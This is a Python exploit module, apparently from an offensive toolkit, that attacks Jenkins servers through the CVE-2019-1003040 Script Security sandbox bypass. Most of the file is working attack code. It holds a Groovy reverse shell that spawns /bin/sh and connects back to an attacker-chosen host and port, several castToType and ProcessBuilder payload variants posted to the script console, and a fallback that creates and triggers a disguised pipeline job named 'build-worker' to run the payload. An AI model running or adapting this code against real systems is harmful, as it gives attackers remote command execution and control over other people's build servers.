"""
CVE-2019-1003040: Jenkins Script Security Plugin Constructor Invocation Bypass

This exploit leverages a bypass in the Jenkins Script Security Plugin that allows
invocation of arbitrary constructors via castToType, leading to RCE.
"""

from typing import Any

from jenkins_breaker.core.authentication import CrumbManager
from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2019_1003040(ExploitModule):
    """Script Security sandbox bypass via arbitrary constructor invocation using castToType."""

    CVE_ID = "CVE-2019-1003040"

    METADATA = ExploitMetadata(
        cve_id="CVE-2019-1003040",
        name="Jenkins Script Security Constructor Bypass",
        description="Sandbox bypass via arbitrary constructor invocation using castToType",
        affected_versions=["<= 1.55", "< 1.56"],
        mitre_attack=["T1190", "T1059", "T1059.007"],
        severity="critical",
        references=[
            "https://jenkins.io/security/advisory/2019-03-25/",
            "https://nvd.nist.gov/vuln/detail/CVE-2019-1003040",
            "https://amlw.dev/cve/cve-2019-1003040"
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["rce", "sandbox-bypass", "groovy", "constructor-injection"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/script")
            return response.status_code == 200
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2019-1003040 for sandbox bypass via castToType.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments (lhost, lport, cmd)

        Returns:
            ExploitResult: Result of the exploit
        """
        lhost = kwargs.get('lhost')
        lport = kwargs.get('lport')

        if lhost and lport:
            cmd = kwargs.get('cmd', f"""
Thread.start{{
String host="{lhost}";
int port={lport};
Process p=new ProcessBuilder("/bin/sh","-i").redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){{try{{while(pi.available()>0)so.write(pi.read());while(si.available()>0){{int c=si.read();if(c==13)c=10;po.write(c);}}so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}}catch(Exception e){{}}}}p.destroy();s.close();
}}
""".strip())
        else:
            cmd = kwargs.get('cmd')

        if not cmd:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details="No command provided (lhost/lport or cmd required)",
                error="Missing required parameter: cmd or lhost+lport"
            )

        crumb_manager = CrumbManager(
            base_url=session.base_url,
            auth=session.auth,
            verify_ssl=False
        )
        crumb_manager.fetch()

        headers = crumb_manager.get_header()

        # If lhost provided, use direct Groovy socket code instead of ProcessBuilder
        if lhost and lport:
            payloads = [
                cmd,  # Direct Java socket reverse shell
                f'''
@groovy.transform.ASTTest(value={{
    {cmd}
}})
class Exploit {{}}
''',
            ]
        else:
            payloads = [
                f'''
import org.codehaus.groovy.runtime.ScriptBytecodeAdapter
def proc = ScriptBytecodeAdapter.castToType(["{cmd}".split(" ")], ProcessBuilder)
proc.start()
''',
                f'''
import org.kohsuke.groovy.sandbox.impl.Checker
def cmd = "{cmd}"
def proc = Checker.checkedCast(ProcessBuilder, [cmd.split(" ")], false, false, false)
proc.start()
''',
                f'''
import org.codehaus.groovy.runtime.ScriptBytecodeAdapter
def runtime = ScriptBytecodeAdapter.castToType([], Runtime)
runtime.exec("{cmd}")
''',
                f'''
import org.codehaus.groovy.runtime.ScriptBytecodeAdapter
def classLoader = this.class.classLoader
while (classLoader.parent != null) {{
    classLoader = classLoader.parent
}}
def clazz = classLoader.loadClass("java.lang.ProcessBuilder")
def constructor = clazz.getConstructor(String[].class)
def pb = constructor.newInstance(["{cmd}".split(" ")] as Object[])
pb.start()
'''
            ]

        for idx, payload in enumerate(payloads):
            try:
                data = {'script': payload}

                response = session.post("/script", data=data, headers=headers)

                if response.status_code == 200 and 'Result' in response.text:
                    if 'RejectedAccessException' not in response.text and 'UnapprovedUsageException' not in response.text:
                        return ExploitResult(
                            exploit=self.CVE_ID,
                            status="success",
                            details=f"Constructor bypass successful using castToType (variant {idx + 1})",
                            data={
                                "command": cmd,
                                "payload_variant": idx + 1,
                                "method": "castToType"
                            }
                        )
                elif response.status_code == 403:
                    pass

            except Exception:
                pass

        try:
            import random
            import string
            import time
            timestamp = int(time.time() * 1000) % 1000000
            job_name = f"build-worker-{timestamp}-cve2019-1003040"

            if lhost and lport:
                pipeline_payload = f'''
node {{
    stage('Exploit') {{
        {cmd}
    }}
}}
'''
            else:
                pipeline_payload = f'''
import org.codehaus.groovy.runtime.ScriptBytecodeAdapter
node {{
    stage('Exploit') {{
        def cmd = "{cmd}"
        def proc = ScriptBytecodeAdapter.castToType([cmd.split(" ")], ProcessBuilder)
        proc.start()
    }}
}}
'''

            job_xml = f'''<?xml version='1.1' encoding='UTF-8'?>
<flow-definition plugin="workflow-job@2.40">
  <description>CVE-2019-1003040 Exploit</description>
  <keepDependencies>false</keepDependencies>
  <properties/>
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition" plugin="workflow-cps@2.87">
    <script>{pipeline_payload}</script>
    <sandbox>true</sandbox>
  </definition>
  <triggers/>
  <disabled>false</disabled>
</flow-definition>'''

            xml_headers = {'Content-Type': 'application/xml'}
            xml_headers.update(crumb_manager.get_header())

            response = session.post(f"/createItem?name={job_name}", data=job_xml, headers=xml_headers)

            if response.status_code in [200, 201]:
                build_response = session.post(f"/job/{job_name}/build", headers=headers)

                if build_response.status_code in [200, 201, 302]:
                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="success",
                        details="Constructor bypass via pipeline job with castToType",
                        data={
                            "command": cmd,
                            "method": "pipeline_job",
                            "job_name": job_name
                        }
                    )

        except Exception:
            pass

        return ExploitResult(
            exploit=self.CVE_ID,
            status="failure",
            details="All castToType exploitation methods failed"
        )
